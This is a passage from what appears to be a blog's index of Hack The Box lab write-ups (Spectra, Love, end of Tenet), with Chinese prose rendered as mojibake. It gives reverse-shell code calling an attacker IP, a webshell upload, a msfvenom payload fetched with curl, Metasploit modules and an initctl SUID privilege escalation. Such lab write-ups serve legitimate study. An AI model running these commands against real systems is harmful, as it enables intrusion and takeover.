id\\_rsa\n\nå¦‚æœä¸è¡Œï¼Œå’±ä»¬å°±å†æ¥ä¸€æ¬¡å³å¯\n\n![](Hackthebox-Tenet/0886872f-de0a-4337-a3ca-5e5c223f6ea8.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n\næ­£å¥½è¿™ä¸ªæ—¶å€™æˆ‘ç‚¹çš„çƒ§çƒ¤ä¹Ÿåˆ°äº†ï¼Œåƒå¤œå®µå»","tags":["Hackthebox"]},{"title":"Spectra - Hackthebox","url":"/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/","content":"\n# Hackthebox - Spectra\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-Spectra/40981969-2f32-4be6-8b07-40b92a4f8fe4.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-Spectra/e12c6638-da63-4441-8d4d-b1cf416dcc33.png)\n\n**ä¿¡æ¯æœé›†**\n\nä½¿ç”¨nmapè¿›è¡ŒåŸºæœ¬çš„ç«¯å£æ‰«æ\n\nnmap â€“A -sS -sC -sV 10.10.10.229\n\n![](Hackthebox-Spectra/4756298a-80cc-4ef3-8796-eb5e8011f671.png)\n\næˆ‘ä»¬å‘ç°å¼€å¯äº†22ã€80å’Œ3306ç«¯å£\n\nå’±ä»¬è®¿é—®80ç«¯å£çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Spectra/c7f9bfc1-a2aa-4540-9f7a-e7044581761b.png)\n\nå†…å®¹éå¸¸ç®€å•ï¼Œå’±ä»¬çœ‹ä¸€ä¸‹æºä»£ç \n\n![](Hackthebox-Spectra/bb614980-11ea-49fa-a25b-2a6d432a7b87.png)\n\nå‘ç°ä¼šè·³è½¬åˆ°åŸŸåspectra.htb å’±ä»¬åœ¨hostsé‡Œæ·»åŠ è¯¥åŸŸå\n\nvim /etc/hosts\n\n10.10.10.229 spectra.htb [www.spectra.htb](http://www.spectra.htb/)\n\nç„¶åå’±ä»¬è®¿é—®ä¸€ä¸‹è¯•è¯•\n\n![](Hackthebox-Spectra/9c1f59e2-8bb8-43bd-86fd-8f7cc90e08f5.png)\n\nå’±ä»¬å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªwordpressçš„ç«™ç‚¹\n\nåˆ°å¤„ç‚¹äº†ä¸€ä¸‹ä¼¼ä¹æ²¡æœ‰å¯ç”¨çš„ä¸œè¥¿ï¼Œå’±ä»¬çœ‹çœ‹å¦ä¸€ä¸ªè¿æ¥\n\n![](Hackthebox-Spectra/824a6c95-d993-4fd1-9763-5ee2f684ad8a.png)\n\nå»ºç«‹æ•°æ®è¿æ¥é”™è¯¯ï¼Œæ—¢ç„¶æç¤ºè¿™ä¸ªï¼Œåˆå¼€å¯äº†3306ç«¯å£ï¼Œé‚£ä¹ˆåé¢ä¼°è®¡æ˜¯ä¸€å®šä¼šç”¨åˆ°çš„ï¼Œå’±ä»¬å…ˆè®°å½•ä¸€ä¸‹ï¼Œåé¢å¾ˆæœ‰å¯èƒ½ä¼šç”¨åˆ°ï¼Œç„¶åæŠŠçœ¼å…‰æ”¾å›ç¬¬ä¸€ä¸ªé¡µé¢\n\nå’±ä»¬ç›®å‰æ€è·¯å¡å£³äº†ï¼Œä¸çŸ¥é“åšä»€ä¹ˆäº†ï¼Œé‚£å°±æ‰«æä¸€ä¸‹ç›®å½•å§ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨dirbusterå·¥å…·è¿›è¡Œç›®å½•çˆ†ç ´å§\n\n![](Hackthebox-Spectra/c5e556ac-5a56-4755-b682-933d401ec916.png)\n\nå¯¼å…¥åæŒ‰startå¯åŠ¨æ‰«æ\n\n![](Hackthebox-Spectra/9c0bedcb-a66d-4f86-80d7-634638611d86.png)\n\næ‰«æçš„åŒæ—¶æˆ‘ä¹Ÿåœ¨æŒ¨ä¸ªçœ‹ï¼Œå‘ç°/testing/ç›®å½•ä¸‹å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œå’±ä»¬è¿›å…¥çœ‹çœ‹\n\n![](Hackthebox-Spectra/7328b157-ccaa-48c3-b437-241fd55559e2.png)\n\nè¿›æ¥åå‘ç°åˆä¸€äº›phpæ–‡ä»¶ï¼Œçœ‹æ–‡ä»¶åä¼¼ä¹è¿˜æœ‰é…ç½®æ–‡ä»¶ï¼Œå’±ä»¬æŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Spectra/78e79639-fd14-425c-b7c0-2eed375e6101.png)\n\nåœ¨ä¸€åœˆæ–‡ä»¶æŸ¥çœ‹ä¸‹æ¥åéƒ½æ²¡æœ‰çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†åœ¨æ–‡ä»¶wp-config.php.saveçš„æ—¶å€™ï¼Œç‚¹è¿›å»å´æ˜¯ç©ºç™½é¡µé¢ï¼Œä½†æ–‡ä»¶å¤§å°å¤„å´åˆæ˜ç¡®æ˜¾ç¤ºæ˜¯æœ‰å†…å®¹çš„ï¼Œè¿™ä¸€ç‚¹å¼•èµ·äº†æˆ‘çš„æ³¨æ„\n\nå’±ä»¬çœ‹ä¸€ä¸‹ç½‘é¡µæºä»£ç \n\n![](Hackthebox-Spectra/33b630df-0b2f-40eb-804e-d439b5ed5759.png)\n\nå’±ä»¬å±…ç„¶åœ¨è¿™æ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œçœ‹æ¥è¿æ°”è¿˜æ˜¯ä¸é”™çš„\n\ndb\\_name = dev\n\ndb\\_user = devtest\n\ndb\\_password = devteam01\n\n**æ¼æ´åˆ©ç”¨**\n\nè¿™é‡Œæ—¢ç„¶æ‹¿åˆ°äº†æ•°æ®åº“è´¦å·å¯†ç ï¼Œåˆå¼€å¯äº†3306ç«¯å£ï¼Œå’±ä»¬è‡ªç„¶æ˜¯å°è¯•è¿›è¡Œç™»å½•äº†\n\nmysql --host 10.10.10.229 --user devtest --password devteam01 -D dev\n\n![](Hackthebox-Spectra/7f60926b-0f97-494b-a744-60adde3f9b30.png)\n\nä½†æ˜¯è¿™é‡Œå´æ˜¾ç¤ºç™»å½•å¤±è´¥ï¼Ÿä¸å…è®¸è¿æ¥åˆ°è¿™ä¸ªæ•°æ®åº“\n\nå—¯ã€‚ã€‚ã€‚çœ‹æ¥æœç„¶æ²¡æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•å•Šï¼Œé‚£ä¹ˆç°åœ¨å”¯ä¸€ç”¨å¾—åˆ°è´¦å·å¯†ç çš„ï¼Œå°±åªæœ‰wordpressäº†ï¼Œå’±ä»¬åªèƒ½ä»è¿™é‡Œç»§ç»­å…¥æ‰‹äº†\n\n[http://spectra.htb/main/wp-login.php](http://spectra.htb/main/wp-login.php)\n\n![](Hackthebox-Spectra/686ef251-eba4-4521-aa7d-7165b488e7a6.png)\n\nå’±ä»¬è¿›è¡Œç™»å½•\n\nç›´æ¥ä½¿ç”¨ä¹‹å‰è·å–åˆ°çš„æ•°æ®åº“è´¦å·devtestè¿›è¡Œç™»å½•å´æç¤ºæ²¡æœ‰è¿™ä¸ªè´¦å·\n\n![](Hackthebox-Spectra/bf1da408-1c5a-44aa-9068-ce59568085b7.png)\n\nçœ‹æ¥æœç„¶æ²¡æœ‰æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•ï¼Œæˆ‘å¤§æ„äº†ï¼Œæ²¡æœ‰é—ª\n\n![](Hackthebox-Spectra/fadb6925-8c3c-4b4a-808e-14a6d99017a9.png)\n\nå¥½åœ¨è¿™ä¸ªæ—¶å€™ï¼Œçªç„¶çµæ„Ÿä»å¤©è€Œé™ï¼Œå‘ç°ä¸»é¡µæœ‰ä¸€ç¯‡æ–‡ç« ï¼Œæœ€ç»å…¸çš„ä¸€å¥â€œhello worldâ€ï¼Œbut å’±ä»¬çš„é‡ç‚¹ä¸åœ¨è¿™é‡Œï¼Œè€Œæ˜¯åœ¨å‘å¸–äººï¼Œadministrator\n\nå¥½å®¶ä¼™ï¼Œè¿™ä¸å°±æœ‰ç”¨æˆ·åäº†å˜›ï¼Ÿè€Œä¸”åŒæ—¶å’±ä»¬nmapæ²¡æœ‰è¯†åˆ«å‡ºæ“ä½œç³»ç»Ÿï¼Œçœ‹åˆ°è¿™ä¸ªå°±å¯ä»¥æ€€ç–‘æ˜¯windowsäº†\n\n![](Hackthebox-Spectra/868533cb-0788-4021-9b62-77f6eb081c8a.png)\n\nå’±ä»¬ä½¿ç”¨è´¦æˆ·administrator å¯†ç devteam01è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸè¿›å…¥åå°\n\n![](Hackthebox-Spectra/08318735-1667-416e-a8ba-026a8a53d30b.png)\n\nå¹¶ä¸”è·å–åˆ°wordpressçš„ç‰ˆæœ¬ä¸º5.4.2\n\næ‹¿åˆ°ç‰ˆæœ¬äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å·²çŸ¥æ¼æ´è¿›è¡Œæ”»å‡»äº†\n\nå’±ä»¬è¿™é‡Œæœ‰ä¸‰ç§åŠæ³•è·å¾—shell\n\nç¬¬ä¸€ç§ï¼š\n\nä½¿ç”¨msfè¿›è¡Œè´Ÿè½½æ”»å‡»\n\nuse exploit/unix/webapp/wp\\_admin\\_shell\\_upload\n\nset USERNAME administrator\n\nset PASSWORD devteam01\n\nset TARGETURI /main\n\nset rhosts 10.10.10.229\n\nset lhost 10.10.14.135\n\nexploit\n\n![](Hackthebox-Spectra/a46c68a1-4aad-4f22-8e17-e2cbb80103ad.png)\n\nnice æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell\n\nç¬¬äºŒç§ï¼š\n\nä¿®æ”¹404é¡µé¢è¿›è¡Œåå¼¹shell\n\né¦–å…ˆæœ¬åœ°ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\nnc -nvlp 5555\n\n![](Hackthebox-Spectra/f0fedb03-849e-4e78-8dd5-1d58ee44a324.png)\n\nç„¶åå’±ä»¬ç™»å…¥åˆ°ç½‘ç«™åå°\n\n![](Hackthebox-Spectra/6fdc0e3e-5b36-48bb-81b5-38ebd78f36f9.png)\n\nä¿®æ”¹404é¡µé¢çš„æºç \n\nå’±ä»¬æ’å…¥æ¶æ„ä»£ç \n\nä¸‹è½½åœ°å€\n\n[http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz)\n\nå…¶ä¸­éœ€è¦ä¿®æ”¹çš„å†…å®¹\n\nset\\_time\\_limit (0);\n\n\\$VERSION = \"1.0\";\n\n\\$ip = '10.10.14.135'; // CHANGE THIS\n\n\\$port = 5555; // CHANGE THIS\n\n\\$chunk\\_size = 1400;\n\n\\$write\\_a = null;\n\n\\$error\\_a = null;\n\n\\$shell = 'uname -a; w; id; /bin/sh -i';\n\n\\$daemon = 0;\n\n\\$debug = 0;\n\n![](Hackthebox-Spectra/e5eef879-2e13-4c24-b8aa-cd62e9758d21.png)\n\nç„¶åç‚¹å‡»ä¿å­˜\n\n![](Hackthebox-Spectra/2dbab099-3772-4acb-b524-8744271bca13.png)\n\nå•Šè¿™ï¼Œå¥½åƒå¤±è´¥äº†ï¼Œè¯¸ä½ç­‰æˆ‘ç¨ç¨ç ”ç©¶ä¸€ä¸‹\n\n![](Hackthebox-Spectra/a5657c34-b7b4-4f8c-a5d7-c2e7e2241f5c.png)\n\nå¥½äº†ï¼Œç»è¿‡æµ‹è¯•ï¼Œå’±ä»¬å°†æ¨¡æ¿è®¾ç½®ä¸ºTwenty Seventeå°±å¯ä»¥ä¿å­˜äº†\n\nç„¶åå’±ä»¬è®¿é—®404é¡µé¢\n\n[http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php](http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php)\n\næˆåŠŸåå¼¹å›shell\n\n![](Hackthebox-Spectra/b6633049-275d-4919-8110-0ababc2d1387.png)\n\nç¬¬ä¸‰ç§ï¼š\n\nç¬¬ä¸‰ç§å°±æ˜¯åˆ©ç”¨æ’ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œç„¶åä½¿ç”¨msfæ¥è¿›è¡Œshellçš„æ¥æ”¶ï¼Œè¿™ä¸ªæ­¥éª¤å’±ä»¬ä¸å¦‚ç›´æ¥ç¬¬ä¸€æ­¥äº†ï¼Œæœ‰ç‚¹å¤šæ­¤ä¸€ä¸¾ï¼Œæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªå·±è¿›è¡Œç ”ç©¶\n\nexploitåœ°å€\n\n[https://www.exploit-db.com/exploits/36374](https://www.exploit-db.com/exploits/36374)\n\nmsfè®¾ç½®\n\nuse exploit/unix/webapp/wp\\_slideshowgallery\\_upload\n\nset rhosts 192.168.1.101\n\nset targeturi /wordpress\n\nexploit\n\nexecï¼ˆâ€œ / bin / bash -c'bash -i>ï¼†/dev/tcp/10.0.0.1/8080 0>ï¼†1'â€ï¼‰\n\nå‚è€ƒè¿æ¥\n\n[https://www.hackingarticles.in/wordpress-reverse-shell/](https://www.hackingarticles.in/wordpress-reverse-shell/)\n\n**æƒé™æå‡**\n\nå’±ä»¬é¦–å…ˆä½¿ç”¨python3è·å–ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shell\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n![](Hackthebox-Spectra/d0abe880-965e-4e04-8897-f4e3f60cdc28.png)\n\n![](Hackthebox-Spectra/031c4c92-5481-4b75-878a-49d2bc8c8a52.png)\n\næˆ‘ä»¬åœ¨ç¿»æ‰¾æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨optç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªautologin.conf.origæ–‡ä»¶\n\ncatæŸ¥çœ‹åï¼Œå‘ç°æ˜¯æœ‰ä¸ªè‡ªåŠ¨ç™»å½•çš„è„šæœ¬ï¼ŒæŒ‡å‘äº†/etc/autologin\n\nå’±ä»¬è¿‡å»çœ‹çœ‹\n\n![](Hackthebox-Spectra/68955dcb-37aa-4078-a482-58bab345286c.png)\n\nå‘ç°äº†ä¸€ä¸ªpasswdæ–‡ä»¶ï¼Œå’±ä»¬catæŸ¥çœ‹\n\n![](Hackthebox-Spectra/cde245bf-6acc-4175-a3ee-4d49616b1f14.png)\n\nå¾—åˆ°äº†ä¸€ä¸ªå¯†ç \n\nSummerHereWeCome!!\n\n![](Hackthebox-Spectra/7ca73e26-e17c-4b04-addc-d0db95a41efb.png)\n\n![](Hackthebox-Spectra/311a7387-27e8-4097-a0db-d589564d98a8.png)\n\nç»è¿‡æµ‹è¯•å¹¶ç»“åˆå’±ä»¬æ‰¾flagä»¥åŠç¿»ç›®å½•çš„æ—¶å€™å¾—åˆ°çš„æ¶ˆæ¯æ¥çœ‹ï¼Œä¼¼ä¹æ˜¯ç”¨æˆ·katieçš„\n\næ­£å¥½å¼€å¯äº†22ç«¯å£ï¼Œå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•\n\nssh katie@10.10.10.229\n\n![](Hackthebox-Spectra/4e2c24d0-1b7a-40b5-a8c1-c7c385f44f05.png)\n\næˆåŠŸç™»å½•\n\n![](Hackthebox-Spectra/bd7b8a2c-88f5-4a08-bc95-2c849f0921f9.png)\n\næˆåŠŸè·å¾—useræƒé™çš„flag\n\nä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹å’±ä»¬çš„sudoæƒé™\n\n![](Hackthebox-Spectra/f2657385-cc50-4cd3-98f2-6fe2895c5b04.png)\n\nå‘ç°å’±ä»¬å¯ä»¥æ‰§è¡Œ/sbin/initctl\n\nè¿™ä¸ªæƒé™æ˜¯æŸ¥çœ‹å’±ä»¬å¯ç¼–è¾‘çš„æœåŠ¡\n\nsudo initctl list\n\n![](Hackthebox-Spectra/c5ec8080-9167-4e6f-9414-aafab9bcbf65.png)\n\nå¯ç¼–è¾‘çš„æœåŠ¡æŒºå¤šçš„ï¼Œæˆ‘å°±ä¸å…¨éƒ¨æˆªå›¾äº†ï¼Œç„¶åå’±ä»¬è¿›è¡Œç­›é€‰æŸ¥çœ‹\n\n![](Hackthebox-Spectra/f55fb7d0-8370-45a5-a0c6-4f6e4146a1fd.png)\n\nå’±ä»¬åœ¨æœ€åé¢çœ‹åˆ°ä¸€ä¸ªåä¸ºtest2çš„æœªè¿è¡Œä¸”å¯ç¼–è¾‘çš„æœåŠ¡ï¼Œå«è¿™ä¸ªåå­—é‚£å°±è‚¯å®šä¸ä¸€èˆ¬äº†ï¼Œå’±ä»¬look lookï¼Œæ‰€æœ‰çš„æœåŠ¡éƒ½åœ¨/etc/initç›®å½•ä¸‹\n\n![](Hackthebox-Spectra/bd45f2a9-0b96-4350-88df-892961fa151b.png)\n\nè¿™ä¹ˆå¤štestçš„æœåŠ¡ï¼Œå’±ä»¬å°±ä»test.confå¼€å§‹lookå§\n\ncat /etc/init/test.conf\n\n![](Hackthebox-Spectra/31500707-851f-4c1f-8d56-8f9bd9994c2d.png)\n\nå—¯ã€‚ã€‚ã€‚åœ¨è¿™é‡Œæ­£åœ¨è¿è¡Œä¸€ä¸ªnodejsçš„æ–‡ä»¶ nodetest.js å’±ä»¬ä¹Ÿå»look look\n\ncat /srv/nodetest.js\n\n![](Hackthebox-Spectra/5ebce451-c36c-4c06-b548-9060b1f8161f.png)\n\nå’±ä»¬å°†æ¶æ„ä»£ç æ›¿æ¢åˆ°test.confé‡Œï¼Œç„¶åæ‰§è¡Œè¿›è¡Œææƒå§ï¼Œå…¶å®ä¹Ÿå¯ä»¥æ›´æ”¹nodetest.jsçš„æ–‡ä»¶è¿›è¡Œncåå¼¹å¹¶ææƒï¼Œä½†æ˜¯å¥½éº»çƒ¦å•Šï¼Œæˆ‘å°±ç»™å„ä½ä¸€ä¸ªå›¾ï¼Œå¤§å®¶æœ‰å…´è¶£çš„è‡ªå·±ç ”ç©¶å§ï¼Œæˆ‘ä½¿ç”¨ç¬¬äºŒç§åŠæ³•ï¼Œç›´æ¥ä¿®æ”¹test.confçš„å†…å®¹å§\n\nç¬¬ä¸€ç§ï¼š\n\n![](Hackthebox-Spectra/442af819-76f1-4641-96de-a5f88281c22e.png)\n\nç¬¬äºŒç§ï¼š\n\nnano /etc/init/test.conf\n\n![](Hackthebox-Spectra/10cbc613-7c64-4b88-aa5f-1554c5d35d9e.png)\n\næ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯ææƒ\n\nsudo /sbin/initctl start test\n\nä½¿ç”¨sudoæƒé™å¯åŠ¨testæœåŠ¡\n\nls -l /bin/bash\n\næŸ¥çœ‹/bin/bashå³å¯å‘ç°æˆ‘ä»¬çš„SUIDå·²ç»ä¼ é€’ç»™rootç”¨æˆ·\n\n/bin/bash -p\n\nææƒ\n\n![](Hackthebox-Spectra/0312313f-804d-4e16-a25d-14dcfdde16ad.png)\n\nææƒæˆåŠŸ\n\n![](Hackthebox-Spectra/5614724f-e90f-4335-bbda-f4f461446ca4.png)\n\næˆåŠŸè·å¾—rootæƒé™çš„flag å®Œäº‹å„¿æ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"Love - Hackthebox","url":"/2021/05/26/Hackthebox/Easy/Hackthebox-Love/","content":"\n# Hackthebox - Love\n# **é¶åœºä¿¡æ¯**\n![](Hackthebox-Love/8fa5e3c7-59bb-4c60-ba00-e55d24097e26.png)\n\n# **é¶åœºç±»å‹**\n![](Hackthebox-Love/2cc5ea23-2092-4367-aeeb-bc80eaa3ea66.png)\n\n# **ä¿¡æ¯æœé›†**\n## Nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡ŒåŸºæœ¬çš„ç«¯å£æ¢æµ‹\n\nNmap -A -sS -sV -sC 10.10.10.239\n\n![](Hackthebox-Love/b4a37f46-931a-492d-9d88-ee1e4d726fcc.png)\n\nNmapæ¢æµ‹åˆ°å¼€å¯äº†80ã€135ã€139ã€443ã€445ã€3306ã€5000ã€5040ã€5985ã€5986ã€47001ã€49664-49670ä¹‹é—´çš„ç«¯å£ï¼Œå…¶ä¸­80å’Œ443è¿˜æœ‰5000ä¸ºwebæœåŠ¡\n\nNmapæ¢æµ‹å‘ç° 443ç«¯å£çš„sslè¯ä¹¦ä¸Šæç¤ºäº†ä¸¤ä¸ªåŸŸåï¼Œ åˆ†åˆ«ä¸ºlove.htbä»¥åŠstaging.love.htb\n\næˆ‘ä»¬é€šè¿‡ä¿®æ”¹hostsæ–‡ä»¶æŒ‡å®šè¿™ä¸¤ä¸ªåŸŸåè§£æçš„IPä¸ºé¶åœºçš„IP 10.10.10.239\n\n```bash\nVim /etc/hosts\n```\n![](Hackthebox-Love/dbd938df-c131-4b5a-b7fa-2cfd79fe89af.png)\n\n## Http\næˆ‘ä»¬è®¿é—®5000ç«¯å£çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿\n\n![](Hackthebox-Love/b134a206-6392-419e-8cb8-173cf5431e73.png)\n\næç¤ºæˆ‘ä»¬æ²¡æœ‰è®¿é—®çš„æƒé™ï¼Œé‚£å°±å…ˆä¸ç®¡è¿™ä¸ªï¼Œæˆ‘ä»¬å»çœ‹çœ‹80ç«¯å£\n\n![](Hackthebox-Love/21338137-44c9-46d8-b6ac-f9f0d791d2e3.png)\n\n80ç«¯å£æœ‰ä¸€ä¸ªç™»å½•æ¡†\n\né€šè¿‡æœç´¢voting systemç³»ç»Ÿå‘ç°æ˜¯å­˜åœ¨æ³¨å…¥çš„\n\næ¼æ´å‚è€ƒåœ°å€\n\n> [https://www.exploit-db.com/exploits/49817](https://www.exploit-db.com/exploits/49817)\n\n> [https://www.exploit-db.com/exploits/49846](https://www.exploit-db.com/exploits/49846)\n\næˆ‘ä»¬æŠ“ä¸ªåŒ…æ¥æ³¨å…¥ä¸€æ³¢\n\n![](Hackthebox-Love/efceb2a5-95bb-4c33-b72e-3e678861dcaf.png)\n\nå°†æŠ“åˆ°çš„æ•°æ®åŒ…ä¿å­˜åœ¨æœ¬åœ°ï¼Œä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥\n\næ²¡æœ‰æ³¨å…¥å‡ºæ¥ï¼Œæˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ªæ€è·¯ï¼Œæ¥çœ‹çœ‹ç¬¬äºŒä¸ªåŸŸå\n\n# **æ¼æ´åˆ©ç”¨**\n> [http://staging.love.htb/](http://staging.love.htb/)\n\nè¿›å…¥è¯¥é¡µé¢åï¼Œæœ‰ä¸¤ä¸ªå¯ç‚¹å‡»çš„æŒ‰é’®ï¼Œåˆ†åˆ«æ˜¯Homeå’ŒDemo\n\nHomeæ˜¯ä¸€ä¸ªç™»é™†å£ï¼Œæˆ–è®¸æœ‰æ³¨å…¥ï¼Œä½†å…ˆçœ‹çœ‹å…¶ä»–åŠŸèƒ½\n\n![](Hackthebox-Love/108f2f98-b662-4ce6-8bbe-fc73a4708922.png)\n\nç‚¹å‡»Demoï¼Œè¿›å…¥è¿™ä¸ªé¡µé¢\n\n![](Hackthebox-Love/e19a6d8d-62b6-474f-aa72-cfa4231cada3.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªæ‰«æå™¨ï¼Œå’±ä»¬éšä¾¿æ‰«æä¸€ä¸ªé¡µé¢è¯•è¯•\n\néšä¾¿æ‰«æäº†ä¸€ä¸ªé¡µé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆååº”ï¼Œæ€è·¯åˆ°è¿™é‡Œå°±å¡å£³äº†å‘€ã€‚\n\nåœ¨æ‰“äº†ä¸€æŠŠLOLè¢«é˜Ÿå‹å‘äº†åï¼Œçªç„¶æ¥äº†æ€è·¯\n\næˆ‘ä»¬ä¸æ˜¯æœ‰ä¸€ä¸ªæ— æƒé™è®¿é—®çš„5000ç«¯å£å—ï¼Œé‚£è®©å®ƒè‡ªå·±å‘å‡ºè®¿é—®è¯·æ±‚ï¼Œæ˜¯å¦å°±æœ‰æƒé™äº†ï¼Ÿè¯´å¹²å°±å¹²\n\n![](Hackthebox-Love/90768d7f-e87f-4133-8f04-92e3291beb48.png)\n\nå¼¹å‡ºäº†å¦‚ä¸‹é¡µé¢\n\n![](Hackthebox-Love/945fe27c-aae1-45b0-b82c-85664482d161.png)\n\nè¿™æ—¶å€™æˆ‘ä»¬å°±æ‹¿åˆ°å¯†ç äº†è´¦å·å’Œå¯†ç \n\nè´¦å·admin\n\nå¯†ç @LoveIsInTheAir!!!!\n\nç„¶åæˆ‘ä»¬å»ç™»å½•\n\n![](Hackthebox-Love/1b7f6861-3ec2-4727-983c-2dc67c3863d5.png)\n\næç¤ºæ‰¾ä¸åˆ°è¿™ä¸ªIDï¼Ÿè¿™ä¸å¯¹åŠ²å•Šå…„å¼Ÿ\n\nå’±ä»¬å»æ‰¾ä¸€ä¸‹è¿™ä¸ªcms\n\nç»è¿‡æœç´¢åï¼Œæ‰¾åˆ°äº†è¯¥cmsçš„æºç \n\næ‚¨çŒœæ€ä¹ˆç€ï¼Ÿè¿˜çœŸè®©æˆ‘æ‰¾åˆ°äº†å“å˜¿\n\n> [https://www.sourcecodester.com/php/12306/voting-system-using-php.html](https://www.sourcecodester.com/php/12306/voting-system-using-php.html)\n\nè¿™æ˜¯å’±ä»¬æ‰¾åˆ°çš„cmsæºç \n\nå…¶ä¸­çœ‹åˆ°äº†ä¸€ä¸ªä½¿ç”¨æ•™ç¨‹\n\n![](Hackthebox-Love/e60bc649-a1c2-4210-9c13-192c45b82b3d.png)\n\næ ¹æ®æç¤ºï¼Œåå°ç™»å½•é¡µé¢åœ¨/admin/ä¸‹ï¼Œè¿™ä¸ªindex.phpå°±æ˜¯ç”¨æ¥è¿·æƒ‘å’±ä»¬çš„ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™\n\nå’±ä»¬è®¿é—®/admin/ç›®å½•è¿›è¡Œç™»å½•\n\n![](Hackthebox-Love/0f0b1217-5c4d-4572-b3ab-394371ef9369.png)\n\næˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œå’±ä»¬ç”¨è´¦å·å¯†ç è¿›è¡Œç™»å½•\n\n![](Hackthebox-Love/716020cf-ca5e-4133-91f7-e66195536eaf.png)\n\næ€»ç®—æ˜¯æ’é™¤ä¸‡éš¾è¿›å…¥åå°äº†\n\nè¿™é‡Œå’±ä»¬ä½¿ç”¨Votersæ¥è¿›è¡Œgetshell\n\n![](Hackthebox-Love/b8526e08-f60e-49a6-8ea5-74526c9b051e.png)\n\nåˆ›å»ºä¸€ä¸ªæ–°é€‰æ°‘\n\n![](Hackthebox-Love/cb593e86-1778-42b9-b7e1-ffbd7a72ae19.png)\n\nåœ¨photoå¤„ä¼ å…¥æˆ‘ä»¬çš„shellæˆ–æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œè¿›å…¥\n\n> [http://love.htb/images](http://love.htb/images)\n\næŸ¥çœ‹æˆ‘ä»¬çš„shellæ˜¯å¦ä¸Šä¼ ä¸Šå»\n\n![](Hackthebox-Love/080b154b-af31-4b1d-a977-dd94066479c4.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„shellå·²ç»ä¸Šä¼ ä¸Šå»äº†ï¼Œå’±ä»¬è¿›å…¥shell\n\n![](Hackthebox-Love/b352b680-3366-4989-8a2a-6d67cd5275e9.png)\n\nOK å’±ä»¬æˆåŠŸè·å¾—äº†ä¸€ä¸ªäº¤äº’å¼shellï¼Œä½†æ¯•ç«Ÿä¸æ˜¯ä¸€ä¸ªç¨³å®šçš„shellï¼Œå’±ä»¬æ¥ä¸‹æ¥æƒ³åŠæ³•è·å¾—ä¸€ä¸ªç¨³å®šçš„shellï¼Œå¹¶ä¸”å› ä¸ºæŸäº›è„šæœ¬çš„åŸå› ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„webshellå¯èƒ½ä¼šè¢«åˆ é™¤\n\nå’±ä»¬ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªexeçš„æœ¨é©¬\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=4444 -f exe > shell.exe\n```\n![](Hackthebox-Love/66aafce4-d79e-4f26-b437-b52ef4cf759d.png)\n\nä½¿ç”¨msfconsoleè¿›è¡Œç›‘å¬\n\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.135\nset LPORT 4444\nexploit\n```\n![](Hackthebox-Love/f494a0a8-25ad-49a0-bca0-1894adaa429c.png)\n\nç„¶åæˆ‘ä»¬æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\nç„¶ååœ¨shellé‡Œä½¿ç”¨curlè¿›è¡Œä¸‹è½½\n\n```bash\nCurl [http://10.10.14.135/shell.exe -o shell.exe](http://10.10.14.135/shell.exe%20-o%20shell.exe)\n```\n![](Hackthebox-Love/b7d16c08-189e-4ad3-8432-1c61710e7658.png)\n\nOKï¼ŒæˆåŠŸä¸‹è½½ä¸‹æ¥äº†ï¼Œå’±ä»¬ç›´æ¥è¿è¡Œè¯¥æœ¨é©¬\n\n![](Hackthebox-Love/766d2271-2293-42cd-aa27-baeddf4bb55f.png)\n\nè¿è¡ŒåæˆåŠŸå¼¹å›äº†shell\n\n![](Hackthebox-Love/b3e81634-96be-4c46-8b5f-6f624ae88b8d.png)\n\n![](Hackthebox-Love/0dbb4cb9-fbc0-41e5-8488-eb1e0a16d0e6.png)\n\næˆ‘ä»¬æˆåŠŸè·å¾—ç¬¬ä¸€ä¸ªflag\n\n# 